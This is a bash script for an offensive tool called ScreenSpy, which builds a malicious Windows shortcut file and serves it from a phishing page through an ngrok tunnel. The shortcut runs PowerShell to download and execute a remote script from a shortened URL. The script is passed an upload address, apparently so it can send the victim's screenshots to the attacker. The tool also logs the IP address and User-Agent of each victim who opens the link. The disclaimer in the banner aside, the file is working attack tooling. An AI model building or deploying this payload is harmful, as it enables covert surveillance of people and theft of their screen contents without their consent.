#!/bin/bash
# ScreenSpy v1.0
# coded by: github.com/thelinuxchoice/screenspy
# twitter: @linux_choice

trap 'printf "\n";stop' 2

#Banner/Design by David Vega (@DaveNISC)

banner() {

echo -e "\e[1m  _____                          \e[0m" "\e[1;31m█████\e[0m" "\e[1;32m█████\e[0m"
echo -e "\e[1m / ____|                         \e[0m" "\e[1;31m█████\e[0m" "\e[1;32m█████\e[0m"
echo -e "\e[1m| (___   ___ _ __ ___  ___ _ __  \e[0m" "\e[1;37m───────────\e[0m"
echo -e "\e[1m \___ \ / __| '__/ _ \/ _ \ '_ \ \e[0m" "\e[1;34m█████\e[0m" "\e[1;33m█████\e[0m"
echo -e "\e[1m ____) | (__| | |  __/  __/ | | |\e[0m" "\e[1;34m█████\e[0m" "\e[1;33m█████\e[0m"
echo -e "\e[1m|_____/ \___|_|  \___|\___|_| |_|\e[0m" "\e[1m────────────>\e[0m""\e[1;37m Windows\e[0m"
echo -e "\e[1;31mTwitter\e[0m""\e[1;37m:\e[0m" "\e[3;1;36m@linux_choice\e[0m" "\e[1;31m  ___ _ __  _   _ \e[0m"
echo -e "\e[1;31mGitHub\e[0m""\e[1;37m :\e[0m" "\e[3;1;36mthelinuxchoice\e[0m" "\e[1;31m/ __| '_ \| | | |\e[0m"
echo -e "\e[1;31mVersion\e[0m""\e[1;37m:\e[0m" "\e[3;1;36m1.0\e[0m" "\e[1;31m           \__ \ |_) | |_| |\e[0m"
echo -e "\e[1;31m                        |___/ .__/ \__, |\e[0m"
echo -e "\e[1;31m                            | |     __/ |\e[0m"
echo -e "\e[1;31m                            |_|    |___/ \e[0m"
echo
echo -e "\e[1;31m   >\e[0m""\e[1;33mDisclaimer: this tool is designed for security\e[0m""\e[1;31m<\e[0m"
echo -e "\e[1;31m   >\e[0m""\e[1;33mtesting in an authorized simulated cyberattack\e[0m""\e[1;31m<\e[0m"
echo -e "\e[1;31m   >\e[0m""\e[1;33mAttacking targets without prior mutual consent\e[0m""\e[1;31m<\e[0m"
echo -e "\e[1;31m   >\e[0m""\e[1;33mis illegal! \e[0m""\e[1;31m                                  <\e[0m"
echo
echo -e "\e[1;31m1.\e[0m" "\e[3m\e[92mngrok\e[0m"
echo -e "\e[1;31m2.\e[0m" "\e[3m\e[92mcustom\e[0m"
#echo -e "\e[1;31m3.\e[0m" "\e[3moption 3\e[0m"
#echo -e "\e[1;31m4.\e[0m" "\e[3moption 4\e[0m"
echo
#echo -e "\e[1;31m┌─[\e[0m""\e[1;37mPlease insert option\e[0m""\e[1;31m]\e[0m"
#echo -e "\e[1;31m└──╼\e[0m"

}

banner0() {

printf "\e[1;93m  _______ \e[0m\e[1;91m                           \e[0m\e[1;93m _______\e[0m\e[1;91m              \e[0m\n"
printf "\e[1;93m |   _   .\e[0m\e[1;91m----.----.-----.-----.-----\e[0m\e[1;93m|   _   .\e[0m\e[1;91m-----.--.--. \e[0m\n"
printf "\e[1;93m |   1___|\e[0m\e[1;91m  __|   _|  -__|  -__|     \e[0m\e[1;93m|   1___|\e[0m\e[1;91m  _  |  |  | \e[0m\n"
printf "\e[1;93m |____   |\e[0m\e[1;91m____|__| |_____|_____|__|__\e[0m\e[1;93m|____   |\e[0m\e[1;91m   __|___  | \e[0m\n"
printf "\e[1;93m |:  1   |\e[0m\e[1;91m                           \e[0m\e[1;93m|:  1   |\e[0m\e[1;91m__|  |_____| \e[0m\n"
printf "\e[1;93m |::.. . |\e[0m\e[1;91m                           \e[0m\e[1;93m|::.. . |\e[0m\e[1;91m             \e[0m\n"
printf "\e[1;93m \`-------'  >==================>>>>  \`-------'             \e[0m\n"
printf "\n"                                                          
printf " \e[1;77mv1.0 coded by github.com/thelinuxchoice/screenspy\e[0m\n"
printf " \e[34mtwitter:\e[0m\e[1;77m @linux_choice\e[0m\n"


printf "\n"
printf "\e[91m Disclaimer: this tool is designed for security\n"
printf " testing in an authorized simulated cyberattack\n"
printf " Attacking targets without prior mutual consent\n"
printf " is illegal!\n"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

exit 1

}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require PHP but it's not installed. Install it. Aborting."; exit 1; }
command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }

}


ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting php server (port 3333)...\n"
php -c php.ini -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;91m Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}


settings2() {

default_payload_name="ScreenSpy"
#printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name
#read payload_name
printf '\e[1;31m┌─[\e[0m\e[1;37mPayload name (Default:\e[0m\e[1;77m %s )\e[0m\e[1;31m]\e[0m\n' $default_payload_name
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' option_server
printf "\e[0m"
payload_name="${payload_name:-${default_payload_name}}"
default_secs="3"
#printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Seconds between Screenshots (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_secs
#read secs
printf '\e[1;31m┌─[\e[0m\e[1;37mSeconds between Screenshots (Default:\e[0m\e[1;77m %s )\e[0m\e[1;31m]\e[0m\n' $default_secs
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' option_server
printf "\e[0m"
secs="${secs:-${default_secs}}"
#read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Redirect page (after delivering payload): \e[0m' redirect_url
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mRedirect page (after delivering payload)\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' redirect_url
printf "\e[0m"
redirect_url="${redirect_url:-${default_redirect_url}}"

}

start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi

#printf "\n"
#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"

echo -e "\e[1;31m┌─[\e[0m""\e[1;37mPlease insert webserver option\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' option_server
printf "\e[0m"
default_option_server="1"
default_redirect_url="https://www.google.com"
#read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
settings2
ngrok_server
payload
listener
elif [[ $option_server -eq 2 ]]; then

echo -e "\e[1;31m┌─[\e[0m""\e[1;37mWebserver\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' custom_ip
printf "\e[0m"

#read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Webserver: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
webserver=$custom_ip
settings2
payload
listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

server() {

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting localhost.run server...\e[0m\n"

if [[ $subdomain_resp == true ]]; then

ssh -T -tt -o StrictHostKeyChecking=no -R 80:localhost:3333 "$subdomain"@ssh.localhost.run > sendlink &
sleep 4
else
$(which sh) -c 'ssh -t -t -o StrictHostKeyChecking=no  -R 80:localhost:3333 ssh.localhost.run 2> /dev/null > sendlink ' &
sleep 4
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
rm -f ip.txt
}

listener() {

if [[ $forward == true ]];then
checkfound
else
default_start_listener="Y"
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mStart Listener? [Y/n]\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' start_listener
printf "\e[0m"
#printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
#read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
checkfound
else
exit 1
fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target opened the link!\n"
catch_ip
fi

if [[ -e "log.log" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Screenshot received!\e[0m\e[1;77m Saved: screenshots/\e[0m\n"
rm -rf log.log
fi

done
sleep 0.5

}

#param_HasIconLocation="c:\Windows\SysWOW64\Ronda.ico" #param_HasIconLocation="c:\Windows\SysWOW64\OneDrive.ico"

mslink() {

IS_PRINTER_LNK=0
 
#cmd='%systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe'
cmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
LNK_TARGET="$cmd"
IFS=$'\n'
param_HasArguments='-win 1 -c $scriptPath = iwr -useb "https://tinyurl.com/scr33py";Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -Args "'$webserver'/upload.php, '$secs'"' 

OUTPUT_FILE="$payload_name.lnk"


# mslink: Allow to create Windows Shortcut without the need of Windows
# 
# Copyright (C) 2019 Mikaël Le Bohec
# 
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.

#############################################################################################
# mslink.sh v1.3
#############################################################################################
# Ce script permet de créer un Raccourci Windows (Fichier .LNK)
# Script créé en se basant sur la doc 
#   http://msdn.microsoft.com/en-us/library/dd871305.aspx
#############################################################################################

#OPTIONS=$(getopt -q -n ${0} -o hpl:o:n:w:a:i: -l help,lnk-target:,output-file:,name:,working-dir:,arguments:,icon:,printer-link -- "$@")

#eval set -- ${OPTIONS}

#while true; do
#  case "$1" in
#    -h|--help) HELP=1 ;;
#    -p|--printer-link) IS_PRINTER_LNK=1 ;;
#    -l|--lnk-target) LNK_TARGET="$2" ; shift ;;
#    -o|--output-file) OUTPUT_FILE="$2" ; shift ;;
#    -n|--name) param_HasName="$2" ; shift ;;
#    -w|--working-dir) param_HasWorkingDir="$2" ; shift ;;
#    -a|--arguments) param_HasArguments="$2" ; shift ;;
#    -i|--icon) param_HasIconLocation="$2" ; shift ;;
#    --)        shift ; break ;;
#    *)         echo "Option inconnue : $1" ; exit 1 ;;
#  esac
#  shift
#done

#if [ $# -ne 0 ]; then
#  echo "Option(s) inconnue(s) : $@"
#  exit 1
#fi

#[ ${#LNK_TARGET} -eq 0 ] || [ ${#OUTPUT_FILE} -eq 0 ] && echo "
#Usage :
# ${0} -l cible_du_fichier_lnk [-n description] [-w working_dir] [-a cmd_args] [-i icon_path] -o mon_fichier.lnk [-p]

#Options :
# -l, --lnk-target               Précise la cible du raccourci
# -o, --output-file              Enregistre le raccourci dans un fichier
# -n, --name                     Spécifie une description au raccourci
# -w, --working-dir              Spécifie le répertoire de lancement de la commande
# -a, --arguments                Spécifie les arguments de la commande lancée
# -i, --icon                     Spécifie le chemin de l'icône
# -p, --printer-link             Génère un raccourci de type imprimante réseau
#" && exit 1

#############################################################################################
# Fonctions
#############################################################################################

function ascii2hex() {
	echo $(echo -n ${1} | hexdump -v -e '/1 " x%02x"'|sed s/\ /\\\\/g)
}

function gen_LinkFlags() {
	echo '\x'$(printf '%02x' "$((HasLinkTargetIDList + HasName + HasWorkingDir + HasArguments + HasIconLocation))")${LinkFlags_2_3_4}
}

function gen_Data_string() {
        ITEM_SIZE=$(printf '%04x' $((${#1})))
        echo '\x'${ITEM_SIZE:2:2}'\x'${ITEM_SIZE:0:2}$(ascii2hex "${1}")
}

function gen_IDLIST() {
        ITEM_SIZE=$(printf '%04x' $((${#1}/4+2)))
        echo '\x'${ITEM_SIZE:2:2}'\x'${ITEM_SIZE:0:2}${1}
}

function convert_CLSID_to_DATA() {
	echo -n ${1:6:2}${1:4:2}${1:2:2}${1:0:2}${1:11:2}${1:9:2}${1:16:2}${1:14:2}${1:19:4}${1:24:12}|sed s/"\([A-Fa-f0-9][A-Fa-f0-9]\)"/\\\\x\\1/g
}

#############################################################################################
# Variables issues de la documentation officielle de Microsoft
#############################################################################################

HasLinkTargetIDList=0x01
HasName=0x04
HasWorkingDir=0x10
HasArguments=0x20
HasIconLocation=0x40

HeaderSize='\x4c\x00\x00\x00'							# HeaderSize
LinkCLSID=$(convert_CLSID_to_DATA "00021401-0000-0000-c000-000000000046")	# LinkCLSID
LinkFlags_2_3_4='\x01\x00\x00'							# ForceNoLinkInfo 
LinkFlags=""

FileAttributes_Directory='\x10\x00\x00\x00'					# FILE_ATTRIBUTE_DIRECTORY
FileAttributes_File='\x20\x00\x00\x00'						# FILE_ATTRIBUTE_ARCHIVE

CreationTime='\x00\x00\x00\x00\x00\x00\x00\x00'
AccessTime='\x00\x00\x00\x00\x00\x00\x00\x00'
WriteTime='\x00\x00\x00\x00\x00\x00\x00\x00'

FileSize='\x00\x00\x00\x00'
IconIndex='\x00\x00\x00\x00'
ShowCommand='\x01\x00\x00\x00'							# SW_SHOWNORMAL
Hotkey='\x00\x00'								# No Hotkey
Reserved='\x00\x00'								# Valeur non modifiable
Reserved2='\x00\x00\x00\x00'							# Valeur non modifiable
Reserved3='\x00\x00\x00\x00'							# Valeur non modifiable
TerminalID='\x00\x00'								# Valeur non modifiable

CLSID_Computer="20d04fe0-3aea-1069-a2d8-08002b30309d"				# Poste de travail
CLSID_Network="208d2c60-3aea-1069-a2d7-08002b30309d"				# Favoris réseau

#############################################################################################
# Constantes trouvées à partir de l'analyse de fichiers lnk
#############################################################################################

PREFIX_LOCAL_ROOT='\x2f'							# Disque local
PREFIX_FOLDER='\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'		# Dossier de fichiers
PREFIX_FILE='\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'			# Fichier
PREFIX_NETWORK_ROOT='\xc3\x01\x81'						# Racine de serveur de fichiers réseau
PREFIX_NETWORK_PRINTER='\xc3\x02\xc1'						# Imprimante réseau

END_OF_STRING='\x00'

#############################################################################################

if [ ! -z "${param_HasName}" ]; then
	STRING_DATA=${STRING_DATA}$(gen_Data_string ${param_HasName})
else
	HasName=0x00
fi
if [ ! -z "${param_HasWorkingDir}" ]; then
	STRING_DATA=${STRING_DATA}$(gen_Data_string ${param_HasWorkingDir})
else
	HasWorkingDir=0x00
fi
if [ ! -z "${param_HasArguments}" ]; then
	STRING_DATA=${STRING_DATA}$(gen_Data_string $(echo -ne "${param_HasArguments}"))
else
	HasArguments=0x00
fi
if [ ! -z "${param_HasIconLocation}" ]; then
	STRING_DATA=${STRING_DATA}$(gen_Data_string ${param_HasIconLocation})
else
	HasIconLocation=0x00
fi

LinkFlags=$(gen_LinkFlags)

# On retire l'anti-slash final s'il y en a un
LNK_TARGET=${LNK_TARGET%\\}


# On sépare le chemin racine du lien de la cible finale
# On distingue aussi si le lien est de type local ou réseau
# On définie la valeur Item_Data suivant le cas d'un lien réseau ou local

IS_ROOT_LNK=0
IS_NETWORK_LNK=0

if [[ "${LNK_TARGET}" == \\\\* ]]; then
	IS_NETWORK_LNK=1
	PREFIX_ROOT=${PREFIX_NETWORK_ROOT}
	Item_Data='\x1f\x58'$(convert_CLSID_to_DATA ${CLSID_Network})

        TARGET_ROOT="${LNK_TARGET%\\*}"
        if [[ ${LNK_TARGET} == \\\\*\\* ]]; then
                TARGET_LEAF=${LNK_TARGET##*\\}
        fi
        if [ ${TARGET_ROOT} == \\ ]; then
                TARGET_ROOT="${LNK_TARGET}"
        fi
else
	PREFIX_ROOT=${PREFIX_LOCAL_ROOT}
	Item_Data='\x1f\x50'$(convert_CLSID_to_DATA ${CLSID_Computer})

	TARGET_ROOT=${LNK_TARGET%%\\*}
        if [[ "${LNK_TARGET}" == *\\* ]]; then
		TARGET_LEAF="${LNK_TARGET#*\\}"
        fi
	[[ ! ${TARGET_ROOT} == *\\ ]] && TARGET_ROOT=${TARGET_ROOT}'\'
fi

if [ ${IS_PRINTER_LNK} -eq 1 ]; then
	PREFIX_ROOT=${PREFIX_NETWORK_PRINTER}
	TARGET_ROOT="${LNK_TARGET}"
	IS_ROOT_LNK=1
fi

[ "${#TARGET_LEAF}" -eq 0 ] && IS_ROOT_LNK=1

#############################################################################################

# On sélectionne le préfixe qui sera utilisé pour afficher l'icône du raccourci

if [[ "${TARGET_LEAF}" == *.??? ]]; then
	PREFIX_OF_TARGET=${PREFIX_FILE}
	TYPE_TARGET="fichier"
	FileAttributes=${FileAttributes_File}
else
	PREFIX_OF_TARGET=${PREFIX_FOLDER}
	TYPE_TARGET="dossier"
	FileAttributes=${FileAttributes_Directory}
fi

# On convertit les valeurs des cibles en binaire
TARGET_ROOT=$(ascii2hex "${TARGET_ROOT}")
TARGET_ROOT=${TARGET_ROOT}$(for i in `seq 1 21`;do echo -n '\x00';done) # Nécessaire à partir de Vista et supérieur sinon le lien est considéré comme vide (je n'ai trouvé nul part d'informations à ce sujet)

TARGET_LEAF=$(ascii2hex "${TARGET_LEAF}")

# On crée l'IDLIST qui représente le cœur du fichier LNK

if [ ${IS_ROOT_LNK} -eq 1 ];then
	IDLIST_ITEMS=$(gen_IDLIST ${Item_Data})$(gen_IDLIST ${PREFIX_ROOT}${TARGET_ROOT}${END_OF_STRING})
else
	IDLIST_ITEMS=$(gen_IDLIST ${Item_Data})$(gen_IDLIST ${PREFIX_ROOT}${TARGET_ROOT}${END_OF_STRING})$(gen_IDLIST ${PREFIX_OF_TARGET}${TARGET_LEAF}${END_OF_STRING})
fi

IDLIST=$(gen_IDLIST ${IDLIST_ITEMS})

#############################################################################################

if [ ${IS_NETWORK_LNK} -eq 1 ]; then
	TYPE_LNK="réseau"
	if [ ${IS_PRINTER_LNK} -eq 1 ]; then
		TYPE_TARGET="imprimante"
	fi
else
	TYPE_LNK="local"
fi

#echo "Création d'un raccourci de type \""${TYPE_TARGET}" "${TYPE_LNK}"\" avec pour cible "${LNK_TARGET} ${param_HasArguments} 1>&2
echo -ne ${HeaderSize}${LinkCLSID}${LinkFlags}${FileAttributes}${CreationTime}${AccessTime}${WriteTime}${FileSize}${IconIndex}${ShowCommand}${Hotkey}${Reserved}${Reserved2}${Reserved3}${IDLIST}${TerminalID}${STRING_DATA} > "${OUTPUT_FILE}"


################################ END MSLINK

}

payload() {
if [[ $forward == true ]];then
webserver=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
fi
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[1;93m Building malicious Shortcut file...\e[0m\n"

mslink

if [[ -e $payload_name.lnk ]]; then

zip $payload_name.zip $payload_name.lnk > /dev/null 2>&1

IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.zip)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
sed 's+url_website+'$redirect_url'+g' template.html | sed 's+payload_name+'$payload_name'+g'  > temp
sed -f - temp > index.php << EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] LNK file saved:\e[0m\e[1;92m %s.lnk\e[0m\n" $payload_name
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Zip file saved:\e[0m\e[1;92m %s.zip\e[0m\n" $payload_name

if [ ! -d "screenshots" ]; then
mkdir screenshots
fi

else
printf "\e[1;93mError\e[0m\n"
exit 1
fi

}

banner
dependencies
start
